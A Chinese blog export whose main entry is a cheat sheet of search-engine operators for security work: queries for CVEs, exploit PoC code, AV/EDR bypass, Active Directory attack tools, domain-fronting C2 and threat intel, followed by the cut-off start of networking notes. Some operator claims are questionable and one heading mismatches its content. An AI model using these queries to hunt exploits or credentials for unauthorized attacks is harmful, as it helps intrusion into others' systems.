<h2 id="五、网络安全专业搜索指令"><a href="#五、网络安全专业搜索指令" class="headerlink" title="五、网络安全专业搜索指令"></a>五、网络安全专业搜索指令</h2><h3 id="1-漏洞与CVE搜索"><a href="#1-漏洞与CVE搜索" class="headerlink" title="1. 漏洞与CVE搜索"></a>1. 漏洞与CVE搜索</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;CVE-2024-1234&quot; (site:nvd.nist.gov OR site:exploit-db.com OR site:github.com) filetype:pdf OR filetype:md</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;buffer overflow&quot; OR &quot;stack overflow&quot;) (&quot;exploit&quot; OR &quot;poc&quot;) site:github.com stars:&gt;100 language:python OR language:c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;SQL injection&quot; OR &quot;XSS&quot;) (&quot;bypass&quot; OR &quot;evasion&quot;) (site:owasp.org OR site:portswigger.net) -tutorial -beginner</span><br></pre></td></tr></table></figure>

<h3 id="2-威胁情报与恶意软件分析"><a href="#2-威胁情报与恶意软件分析" class="headerlink" title="2. 威胁情报与恶意软件分析"></a>2. 威胁情报与恶意软件分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Emotet&quot; OR &quot;TrickBot&quot; OR &quot;QakBot&quot;) (&quot;IOC&quot; OR &quot;indicators of compromise&quot;) (site:virustotal.com OR site:hybrid-analysis.com OR site:any.run) filetype:json OR filetype:csv</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;APT29&quot; OR &quot;Cozy Bear&quot; OR &quot;Fancy Bear&quot;) (&quot;threat report&quot; OR &quot;analysis&quot;) (site:fireeye.com OR site:crowdstrike.com OR site:mandiant.com) filetype:pdf after:2023-01-01</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;malware analysis&quot; OR &quot;reverse engineering&quot;) (&quot;YARA rule&quot; OR &quot;signature&quot;) site:github.com (language:python OR language:yara) stars:&gt;50</span><br></pre></td></tr></table></figure>

<h3 id="3-安全工具与框架搜索"><a href="#3-安全工具与框架搜索" class="headerlink" title="3. 安全工具与框架搜索"></a>3. 安全工具与框架搜索</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Metasploit&quot; OR &quot;Cobalt Strike&quot; OR &quot;Empire&quot;) (&quot;detection&quot; OR &quot;evasion&quot; OR &quot;AV bypass&quot;) site:github.com OR site:exploit-db.com -commercial -paid</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Burp Suite&quot; OR &quot;ZAP&quot; OR &quot;OWASP ZAP&quot;) (&quot;extension&quot; OR &quot;plugin&quot;) (&quot;authentication bypass&quot; OR &quot;SSRF&quot;) site:github.com language:java OR language:python</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;nmap&quot; OR &quot;masscan&quot; OR &quot;zmap&quot;) (&quot;script&quot; OR &quot;NSE&quot;) (&quot;vulnerability scanning&quot; OR &quot;service detection&quot;) site:github.com stars:&gt;100</span><br></pre></td></tr></table></figure>

<h3 id="4-高级威胁研究"><a href="#4-高级威胁研究" class="headerlink" title="4. 高级威胁研究"></a>4. 高级威胁研究</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;zero-day&quot; OR &quot;0day&quot;) (&quot;proof of concept&quot; OR &quot;PoC&quot;) (&quot;Windows 11&quot; OR &quot;Linux kernel&quot;) site:github.com OR site:packetstormsecurity.com after:2024-01-01 -tutorial -educational</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Log4j&quot; OR &quot;SpringShell&quot;) (&quot;patch analysis&quot; OR &quot;mitigation&quot;) (site:microsoft.com OR site:apache.org OR site:spring.io) filetype:pdf OR filetype:html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;network forensics&quot; OR &quot;PCAP analysis&quot;) (&quot;Zeek&quot; OR &quot;Bro&quot;) (&quot;malware traffic&quot; OR &quot;C2 communication&quot;) site:github.com (language:python OR language:zeek) stars:&gt;200</span><br></pre></td></tr></table></figure>

<h3 id="5-威胁情报专业搜索"><a href="#5-威胁情报专业搜索" class="headerlink" title="5. 威胁情报专业搜索"></a>5. 威胁情报专业搜索</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;APT41&quot; OR &quot;Winnti&quot;) (&quot;campaign&quot; OR &quot;operation&quot;) (&quot;infrastructure&quot; OR &quot;TTPs&quot;) (site:mandiant.com OR site:proofpoint.com) filetype:pdf after:2023-06-01</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;file hash&quot; OR &quot;MD5&quot; OR &quot;SHA256&quot;) (&quot;malicious&quot; OR &quot;known bad&quot;) (&quot;IoC&quot;) site:virustotal.com OR site:hybrid-analysis.com OR site:malwarebazaar.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;IP blacklist&quot; OR &quot;malicious IP&quot;) (&quot;botnet C2&quot;) (&quot;ASN&quot;) site:blocklist.de OR site:abuseipdb.com OR site:spamhaus.org</span><br></pre></td></tr></table></figure>

<h3 id="6-云安全与容器安全"><a href="#6-云安全与容器安全" class="headerlink" title="6. 云安全与容器安全"></a>6. 云安全与容器安全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;AWS&quot; OR &quot;Azure&quot; OR &quot;GCP&quot;) (&quot;misconfiguration&quot; OR &quot;security best practices&quot;) (&quot;S3 bucket&quot; OR &quot;IAM role&quot;) (site:aws.amazon.com OR site:docs.microsoft.com) filetype:json OR filetype:yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Docker&quot; OR &quot;Kubernetes&quot;) (&quot;security hardening&quot; OR &quot;CIS benchmark&quot;) site:github.com (language:go OR language:python) stars:&gt;500</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Kubernetes security monitoring&quot; OR &quot;K8s audit logs&quot;) (&quot;Falco&quot; OR &quot;kube-bench&quot;) (&quot;container escape&quot; OR &quot;privilege escalation&quot;) site:github.com/falcosecurity</span><br></pre></td></tr></table></figure>

<h3 id="7-企业安全防御"><a href="#7-企业安全防御" class="headerlink" title="7. 企业安全防御"></a>7. 企业安全防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Sigma rule&quot; OR &quot;log detection&quot;) (&quot;Windows Event Log&quot; OR &quot;Sysmon&quot;) (&quot;Mimikatz&quot; OR &quot;PsExec&quot;) site:github.com/sigma-hq/sigma</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;EDR bypass&quot; OR &quot;AV evasion&quot;) (&quot;Cobalt Strike&quot;) (&quot;process injection&quot; OR &quot;direct syscalls&quot;) (site:github.com OR site:specterops.io) -commercial -paid</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Active Directory attack&quot; OR &quot;AD exploitation&quot;) (&quot;BloodHound&quot; OR &quot;SharpHound&quot;) (&quot;ACL abuse&quot; OR &quot;delegation&quot;) site:github.com/BloodHoundAD</span><br></pre></td></tr></table></figure>

<h2 id="六、网络安全实战组合示例"><a href="#六、网络安全实战组合示例" class="headerlink" title="六、网络安全实战组合示例"></a>六、网络安全实战组合示例</h2><h3 id="1-漏洞研究与验证"><a href="#1-漏洞研究与验证" class="headerlink" title="1. 漏洞研究与验证"></a>1. 漏洞研究与验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;zero-day&quot; OR &quot;0day&quot;) (&quot;proof of concept&quot; OR &quot;PoC&quot;) (&quot;Windows 11&quot; OR &quot;Linux kernel&quot;) site:github.com OR site:packetstormsecurity.com after:2024-01-01 -tutorial -educational</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Log4j&quot; OR &quot;SpringShell&quot; OR &quot;ProxyLogon&quot;) (&quot;patch analysis&quot; OR &quot;mitigation&quot;) (site:microsoft.com OR site:apache.org OR site:spring.io) filetype:pdf OR filetype:html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;CVE-2023-1234&quot; OR &quot;CVE-2024-5678&quot;) (&quot;exploit code&quot; OR &quot;exploit development&quot;) (&quot;x86_64&quot; OR &quot;ARM64&quot;) site:exploit-db.com OR site:github.com/gists</span><br></pre></td></tr></table></figure>

<h3 id="2-网络防御与检测"><a href="#2-网络防御与检测" class="headerlink" title="2. 网络防御与检测"></a>2. 网络防御与检测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;IDS/IPS&quot; OR &quot;intrusion detection&quot;) (&quot;Suricata rule&quot; OR &quot;Snort rule&quot;) (&quot;exploit kit&quot; OR &quot;malware delivery&quot;) (site:emergingthreats.net OR site:snort.org) filetype:rules OR filetype:json</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;memory forensics&quot; OR &quot;volatile memory&quot;) (&quot;Volatility&quot; OR &quot;Rekall&quot;) (&quot;malware detection&quot; OR &quot;rootkit analysis&quot;) site:github.com/volatilityfoundation OR site:github.com/google/rekall</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Sigma rule&quot; OR &quot;log detection&quot;) (&quot;Windows Event Log&quot; OR &quot;Sysmon&quot;) (&quot;Mimikatz&quot; OR &quot;PsExec&quot;) site:github.com/sigma-hq/sigma OR site:sigma-core.readthedocs.io</span><br></pre></td></tr></table></figure>

<h3 id="3-红蓝对抗专业搜索"><a href="#3-红蓝对抗专业搜索" class="headerlink" title="3. 红蓝对抗专业搜索"></a>3. 红蓝对抗专业搜索</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;Active Directory attack&quot; OR &quot;AD exploitation&quot;) (&quot;BloodHound&quot; OR &quot;SharpHound&quot;) (&quot;ACL abuse&quot; OR &quot;delegation&quot;) site:github.com/BloodHoundAD OR site:specterops.io -commercial</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;hunting hypothesis&quot; OR &quot;threat hunting&quot;) (&quot;Microsoft Defender&quot;) (&quot;process tree&quot; OR &quot;child process&quot;) (&quot;Mimikatz&quot; OR &quot;Rubeus&quot;) site:github.com/microsoft</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;domain fronting&quot; OR &quot;CDN bypass&quot;) (&quot;Cloudflare&quot; OR &quot;AWS CloudFront&quot;) (&quot;C2 channel&quot;) (site:github.com OR site:specterops.io) -tutorial -beginner</span><br></pre></td></tr></table></figure>

<h3 id="4-IoT-OT与工业安全"><a href="#4-IoT-OT与工业安全" class="headerlink" title="4. IoT&#x2F;OT与工业安全"></a>4. IoT&#x2F;OT与工业安全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;firmware analysis&quot; OR &quot;binwalk&quot;) (&quot;router&quot; OR &quot;camera&quot; OR &quot;IoT device&quot;) (&quot;backdoor&quot; OR &quot;hardcoded credential&quot;) site:github.com (language:python OR language:shell) stars:&gt;300</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;ICS security&quot; OR &quot;SCADA security&quot;) (&quot;Modbus&quot; OR &quot;DNP3&quot;) (&quot;protocol analysis&quot; OR &quot;fuzzing&quot;) (site:github.com OR site:ics-cert.us-cert.gov) filetype:pcap OR filetype:json</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;JTAG debugging&quot; OR &quot;UART interface&quot;) (&quot;firmware extraction&quot; OR &quot;chip-off&quot;) (&quot;ESP32&quot; OR &quot;ARM Cortex&quot;) (site:github.com OR site:hackaday.com) -commercial -paid</span><br></pre></td></tr></table></figure>

<h3 id="5-合规与取证"><a href="#5-合规与取证" class="headerlink" title="5. 合规与取证"></a>5. 合规与取证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;digital forensics&quot; OR &quot;incident response&quot;) (&quot;timeline analysis&quot; OR &quot;artifact collection&quot;) (&quot;Windows&quot; OR &quot;Linux&quot;) (site:sleuthkit.org OR site:autopsy.com) filetype:pdf OR filetype:html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;NIST SP 800-53&quot; OR &quot;NIST Cybersecurity Framework&quot;) (&quot;security controls&quot; OR &quot;compliance mapping&quot;) site:nist.gov OR site:github.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;GDPR compliance&quot; OR &quot;CCPA compliance&quot;) (&quot;data breach notification&quot; OR &quot;incident reporting&quot;) (&quot;72 hours&quot;) (site:gdpr-info.eu OR site:ccpa-info.com) filetype:pdf</span><br></pre></td></tr></table></figure>

<h2 id="七、专业搜索策略与最佳实践"><a href="#七、专业搜索策略与最佳实践" class="headerlink" title="七、专业搜索策略与最佳实践"></a>七、专业搜索策略与最佳实践</h2><h3 id="1-搜索流程优化"><a href="#1-搜索流程优化" class="headerlink" title="1. 搜索流程优化"></a>1. 搜索流程优化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 三步优化法</span><br><span class="line">步骤1：宽泛搜索 → &quot;人工智能&quot;</span><br><span class="line">步骤2：增加限定 → &quot;人工智能&quot; site:edu.cn filetype:pdf</span><br><span class="line">步骤3：精确过滤 → allintitle:&quot;人工智能发展报告&quot; site:tsinghua.edu.cn filetype:pdf -advertisement</span><br><span class="line"></span><br><span class="line"># 网络安全专业应用</span><br><span class="line">初始搜索： &quot;Log4j vulnerability&quot;</span><br><span class="line">第一步优化： &quot;Log4j vulnerability&quot; site:apache.org OR site:github.com</span><br><span class="line">第二步优化： &quot;CVE-2021-44228&quot; (site:nvd.nist.gov OR site:exploit-db.com) filetype:pdf</span><br><span class="line">第三步优化： allintext:&quot;JNDI lookup&quot; (&quot;exploit code&quot; OR &quot;poc&quot;) site:github.com language:java stars:&gt;50 after:2021-12-01</span><br></pre></td></tr></table></figure>

<h3 id="2-搜索结果质量提升"><a href="#2-搜索结果质量提升" class="headerlink" title="2. 搜索结果质量提升"></a>2. 搜索结果质量提升</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 排除低质量内容</span><br><span class="line">关键词 -advertisement -ad -推广 -广告 -buy -purchase -shop -free -download -tutorial -beginner</span><br><span class="line"></span><br><span class="line"># 提升权威性</span><br><span class="line">关键词 (site:gov.cn OR site:edu.cn OR site:org.cn) OR (site:.gov OR site:.edu OR site:.org)</span><br><span class="line"></span><br><span class="line"># 时效性控制</span><br><span class="line">关键词 after:2024-01-01 OR (2024..2024)</span><br><span class="line"></span><br><span class="line"># 网络安全特定优化</span><br><span class="line">(&quot;CVE-2024&quot;) -site:twitter.com -site:reddit.com site:nvd.nist.gov OR site:exploit-db.com</span><br><span class="line">(&quot;malware analysis&quot;) -site:youtube.com site:github.com OR site:virustotal.com</span><br></pre></td></tr></table></figure>

<h3 id="3-多维度验证策略"><a href="#3-多维度验证策略" class="headerlink" title="3. 多维度验证策略"></a>3. 多维度验证策略</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 信息交叉验证</span><br><span class="line">搜索1: (&quot;Log4j vulnerability&quot;) site:apache.org</span><br><span class="line">搜索2: (&quot;CVE-2021-44228&quot;) site:nvd.nist.gov</span><br><span class="line">搜索3: (&quot;Log4Shell&quot;) site:github.com/security-advisories</span><br><span class="line"></span><br><span class="line"># 威胁情报验证</span><br><span class="line">威胁源1: (&quot;APT29&quot;) site:fireeye.com OR site:mandiant.com</span><br><span class="line">威胁源2: (&quot;Cozy Bear&quot;) site:crowdstrike.com OR site:secureworks.com</span><br><span class="line">威胁源3: (&quot;Nobelium&quot;) site:microsoft.com/security/blog</span><br></pre></td></tr></table></figure>

<h2 id="八、错误处理与性能优化"><a href="#八、错误处理与性能优化" class="headerlink" title="八、错误处理与性能优化"></a>八、错误处理与性能优化</h2><h3 id="1-常见错误模式"><a href="#1-常见错误模式" class="headerlink" title="1. 常见错误模式"></a>1. 常见错误模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">❌ 错误模式1：空格问题</span><br><span class="line">site: zhihu.com  # 错误：操作符后不应有空格</span><br><span class="line">✅ 正确：site:zhihu.com</span><br><span class="line"></span><br><span class="line">❌ 错误模式2：引号不匹配</span><br><span class="line">&quot;人工智能发展  # 错误：缺少结束引号</span><br><span class="line">✅ 正确：&quot;人工智能发展&quot;</span><br><span class="line"></span><br><span class="line">❌ 错误模式3：逻辑混乱</span><br><span class="line">A OR B AND C OR D  # 错误：逻辑优先级不明确</span><br><span class="line">✅ 正确：(A OR B) AND (C OR D)</span><br><span class="line"></span><br><span class="line">❌ 网络安全特定错误</span><br><span class="line">allintext:&quot;admin password&quot; site:target.com  # 可能涉及未授权访问</span><br><span class="line">✅ 合规做法：在授权范围内搜索漏洞信息</span><br></pre></td></tr></table></figure>

<h3 id="2-性能优化技巧"><a href="#2-性能优化技巧" class="headerlink" title="2. 性能优化技巧"></a>2. 性能优化技巧</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 避免过度复杂</span><br><span class="line">❌ 过度复杂：(A OR B OR C) AND (D OR E OR F) AND (G OR H OR I) site:X.com filetype:pdf after:2020-01-01 -J -K -L -M -N</span><br><span class="line">✅ 合理复杂：(A OR B) AND (C OR D) site:X.com filetype:pdf after:2020-01-01 -J -K</span><br><span class="line"></span><br><span class="line"># 优先级建议</span><br><span class="line">1. 先用site:限定范围</span><br><span class="line">2. 用filetype:限定类型  </span><br><span class="line">3. 用intitle:/inurl:精确定位</span><br><span class="line">4. 用-排除干扰</span><br><span class="line">5. 最后用时间限定</span><br><span class="line"></span><br><span class="line"># 网络安全搜索优先级</span><br><span class="line">1. 先用site:限定到权威源 (nvd.nist.gov, exploit-db.com)</span><br><span class="line">2. 用filetype:限定到技术文档 (pdf, md, json)</span><br><span class="line">3. 用时间限定确保信息最新</span><br><span class="line">4. 用-author:&quot;非权威作者&quot; 排除非专业内容</span><br></pre></td></tr></table></figure>

<h2 id="九、跨平台搜索策略"><a href="#九、跨平台搜索策略" class="headerlink" title="九、跨平台搜索策略"></a>九、跨平台搜索策略</h2><h3 id="1-桌面浏览器优化"><a href="#1-桌面浏览器优化" class="headerlink" title="1. 桌面浏览器优化"></a>1. 桌面浏览器优化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Chrome高级搜索</span><br><span class="line">1. 在地址栏输入：搜索引擎关键词 + 空格 + 搜索词</span><br><span class="line">2. 设置自定义搜索引擎：chrome://settings/searchEngines</span><br><span class="line">3. 使用快捷键：Ctrl+K 或 Ctrl+E 快速聚焦搜索框</span><br><span class="line"></span><br><span class="line"># Firefox高级搜索</span><br><span class="line">1. 使用about:config启用power mode</span><br><span class="line">2. 设置关键词搜索：右键搜索框→添加关键词</span><br><span class="line">3. 使用Ctrl+K快速搜索</span><br></pre></td></tr></table></figure>

<h3 id="2-移动端搜索技巧"><a href="#2-移动端搜索技巧" class="headerlink" title="2. 移动端搜索技巧"></a>2. 移动端搜索技巧</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手机浏览器</span><br><span class="line">- 长按文本选择→搜索</span><br><span class="line">- 语音搜索优化：用自然语言</span><br><span class="line">- 图片搜索：拍照或上传图片</span><br><span class="line">- 二维码搜索：直接扫描搜索</span><br><span class="line"></span><br><span class="line"># 移动搜索优化</span><br><span class="line">- 简化查询：移动端屏幕小，用简短关键词</span><br><span class="line">- 语音友好：避免复杂符号，用口语化表达</span><br><span class="line">- 位置感知：添加位置关键词（附近、本地等）</span><br></pre></td></tr></table></figure>

<h3 id="3-专业工具整合"><a href="#3-专业工具整合" class="headerlink" title="3. 专业工具整合"></a>3. 专业工具整合</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索引擎API</span><br><span class="line">Google Custom Search JSON API</span><br><span class="line">Bing Web Search API</span><br><span class="line">百度搜索API</span><br><span class="line"></span><br><span class="line"># 浏览器扩展</span><br><span class="line">- 搜索增强插件</span><br><span class="line">- 多引擎同时搜索</span><br><span class="line">- 搜索历史管理</span><br><span class="line">- 搜索结果过滤</span><br><span class="line"></span><br><span class="line"># 自动化脚本</span><br><span class="line">Python + Selenium 自动化搜索</span><br><span class="line">Google Programmable Search Engine</span><br><span class="line">RSS订阅 + 搜索关键词监控</span><br></pre></td></tr></table></figure>

<h2 id="附录：搜索指令速查表"><a href="#附录：搜索指令速查表" class="headerlink" title="附录：搜索指令速查表"></a>附录：搜索指令速查表</h2><h3 id="通用搜索速查表"><a href="#通用搜索速查表" class="headerlink" title="通用搜索速查表"></a>通用搜索速查表</h3><table>
<thead>
<tr>
<th>指令类型</th>
<th>语法</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>精确匹配</td>
<td><code>&quot; &quot;</code></td>
<td>保持短语完整</td>
<td><code>&quot;machine learning&quot;</code></td>
</tr>
<tr>
<td>排除关键词</td>
<td><code>-</code></td>
<td>排除特定关键词</td>
<td><code>apple -fruit</code></td>
</tr>
<tr>
<td>逻辑或</td>
<td><code>OR</code></td>
<td>包含任一关键词</td>
<td><code>car OR automobile</code></td>
</tr>
<tr>
<td>站内搜索</td>
<td><code>site:</code></td>
<td>限定特定网站</td>
<td><code>AI site:github.com</code></td>
</tr>
<tr>
<td>文件类型</td>
<td><code>filetype:</code></td>
<td>限定文件类型</td>
<td><code>report filetype:pdf</code></td>
</tr>
<tr>
<td>标题搜索</td>
<td><code>intitle:</code></td>
<td>标题包含关键词</td>
<td><code>intitle:tutorial</code></td>
</tr>
<tr>
<td>URL搜索</td>
<td><code>inurl:</code></td>
<td>URL包含关键词</td>
<td><code>inurl:admin</code></td>
</tr>
<tr>
<td>定义查询</td>
<td><code>define:</code></td>
<td>查找词语定义</td>
<td><code>define:algorithm</code></td>
</tr>
</tbody></table>
<h3 id="网络安全搜索速查表"><a href="#网络安全搜索速查表" class="headerlink" title="网络安全搜索速查表"></a>网络安全搜索速查表</h3><table>
<thead>
<tr>
<th>搜索场景</th>
<th>推荐指令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CVE搜索</td>
<td><code>&quot;CVE-2024-XXXX&quot; (site:nvd.nist.gov OR site:exploit-db.com)</code></td>
<td>搜索特定CVE漏洞信息</td>
</tr>
<tr>
<td>恶意软件分析</td>
<td><code>(&quot;malware family&quot;) (&quot;YARA rule&quot; OR &quot;IOC&quot;) site:github.com</code></td>
<td>搜索特定恶意软件家族的分析资源</td>
</tr>
<tr>
<td>漏洞利用</td>
<td><code>(&quot;vulnerability type&quot;) (&quot;exploit PoC&quot;) site:github.com -tutorial</code></td>
<td>搜索漏洞利用概念验证代码</td>
</tr>
<tr>
<td>安全工具</td>
<td><code>(&quot;tool name&quot;) (&quot;detection&quot; OR &quot;evasion&quot;) site:github.com stars:&gt;100</code></td>
<td>搜索安全工具及其检测&#x2F;规避方法</td>
</tr>
<tr>
<td>威胁情报</td>
<td><code>(&quot;APT group&quot;) (&quot;campaign report&quot;) (site:fireeye.com OR site:crowdstrike.com)</code></td>
<td>搜索APT组织活动报告</td>
</tr>
<tr>
<td>云安全</td>
<td><code>(&quot;AWS&quot; OR &quot;Azure&quot;) (&quot;misconfiguration&quot;) (&quot;best practices&quot;) site:aws.amazon.com</code></td>
<td>搜索云平台安全配置指南</td>
</tr>
<tr>
<td>二进制分析</td>
<td><code>(&quot;binary analysis&quot;) (&quot;reverse engineering&quot;) (&quot;IDA Pro&quot; OR &quot;Ghidra&quot;) site:github.com</code></td>
<td>搜索二进制分析工具和脚本</td>
</tr>
<tr>
<td>网络取证</td>
<td><code>(&quot;network forensics&quot;) (&quot;PCAP analysis&quot;) (&quot;Zeek&quot; OR &quot;Suricata&quot;) filetype:pcap</code></td>
<td>搜索网络取证样本和工具</td>
</tr>
</tbody></table>
<h3 id="搜索引擎支持情况对比表"><a href="#搜索引擎支持情况对比表" class="headerlink" title="搜索引擎支持情况对比表"></a>搜索引擎支持情况对比表</h3><table>
<thead>
<tr>
<th>指令类型</th>
<th>Google</th>
<th>Bing</th>
<th>百度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>精确匹配</td>
<td><code>&quot; &quot;</code></td>
<td><code>&quot; &quot;</code></td>
<td><code>&quot; &quot;</code></td>
<td>保持短语完整</td>
</tr>
<tr>
<td>排除</td>
<td><code>-</code></td>
<td><code>-</code></td>
<td><code>-</code></td>
<td>排除特定关键词</td>
</tr>
<tr>
<td>逻辑或</td>
<td><code>OR</code></td>
<td><code>OR</code></td>
<td><code>|</code></td>
<td>百度用竖线<code>|</code>代替OR</td>
</tr>
<tr>
<td>站内搜索</td>
<td><code>site:</code></td>
<td><code>site:</code></td>
<td><code>site:</code></td>
<td>限定特定网站</td>
</tr>
<tr>
<td>文件类型</td>
<td><code>filetype:</code></td>
<td><code>filetype:</code></td>
<td><code>filetype:</code></td>
<td>限定文件类型</td>
</tr>
<tr>
<td>标题搜索</td>
<td><code>intitle:</code></td>
<td><code>title:</code></td>
<td><code>intitle:</code></td>
<td>标题包含关键词</td>
</tr>
<tr>
<td>URL搜索</td>
<td><code>inurl:</code></td>
<td><code>url:</code></td>
<td><code>inurl:</code></td>
<td>URL包含关键词</td>
</tr>
<tr>
<td>时间限定</td>
<td><code>after:/before:</code></td>
<td><code>date:</code></td>
<td>无</td>
<td>时间范围控制</td>
</tr>
<tr>
<td>通配符</td>
<td><code>*</code></td>
<td><code>*</code></td>
<td><code>*</code></td>
<td>替代未知字符</td>
</tr>
<tr>
<td>定义</td>
<td><code>define:</code></td>
<td><code>define:</code></td>
<td>无</td>
<td>查找词语定义</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>第 3 章 数据链路层</title>
    <url>/2025/12/05/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<h2 id="3-1-数据链路层的功能"><a href="#3-1-数据链路层的功能" class="headerlink" title="3.1   数据链路层的功能"></a>3.1   数据链路层的功能</h2><h3 id="3-1-1-数据链路层"><a href="#3-1-1-数据链路层" class="headerlink" title="3.1.1   数据链路层"></a>3.1.1   数据链路层</h3><ul>
<li>通信示例<ul>
<li>主机H1 → 路由器R1 → 广域网 → 路由器R2 → 主机H2</li>
<li>主机使用完整五层协议栈</li>
<li>路由器仅使用下三层协议栈</li>
</ul>
</li>
<li>数据流动特点<ul>
<li>数据在路径节点协议栈中多次上下流动</li>
<li>学习时通常只关心水平方向数据链路层</li>
</ul>
</li>
<li>基本概念<ul>
<li><ol>
<li>链路</li>
</ol>
<ul>
<li>定义：节点到相邻节点的一段物理线路</li>
<li>特点：通信路径的组成部分</li>
</ul>
</li>
<li><ol start="2">
<li>数据链路</li>
</ol>
<ul>
<li>组成：物理链路 + 通信协议（硬件和软件）</li>
<li>别名：物理链路 vs 逻辑链路</li>
</ul>
</li>
<li><ol start="3">
<li>帧</li>
</ol>
<ul>
<li>定义：数据链路层协议数据单元</li>
<li>功能：封装网络层数据&#x2F;向上交付数据</li>
</ul>
</li>
</ul>
</li>
<li>3.1.2 链路管理<ul>
<li>定义：连接的建立、维持和释放过程</li>
<li>应用：主要用于面向连接的服务</li>
<li>过程<ul>
<li>确认对方就绪状态</li>
<li>交换必要信息</li>
<li>初始化帧序号</li>
<li>建立连接 → 维持连接 → 释放连接</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-1-4-封装成帧与透明传输"><a href="#3-1-4-封装成帧与透明传输" class="headerlink" title="3.1.4   封装成帧与透明传输"></a>3.1.4   封装成帧与透明传输</h3><ul>
<li>定义<ul>
<li>限制发送方的发送速率，使之不超过接收方的接收能力</li>
<li>防止帧丢失和错误</li>
</ul>
</li>
<li>原因<ul>
<li>链路两端节点的工作速率和缓存空间存在差异</li>
<li>发送能力可能大于接收能力</li>
</ul>
</li>
<li>实现机制<ul>
<li>通过反馈机制控制发送<ul>
<li>可继续发送下一帧的情况</li>
<li>必须暂停发送等待反馈的情况</li>
</ul>
</li>
</ul>
</li>
<li>体系结构差异<ul>
<li>OSI体系结构<ul>
<li>数据链路层实现流量控制</li>
<li>控制相邻节点间数据链路上的流量</li>
</ul>
</li>
<li>TCP&#x2F;IP体系结构<ul>
<li>传输层实现流量控制</li>
<li>控制源端到目的端之间的流量</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-1-5-流量控制"><a href="#3-1-5-流量控制" class="headerlink" title="3.1.5   流量控制"></a>3.1.5   流量控制</h3><ul>
<li>原因<ul>
<li>链路两端节点工作速率和缓存空间存在差异。</li>
<li>发送方发送能力可能大于接收方接收能力。</li>
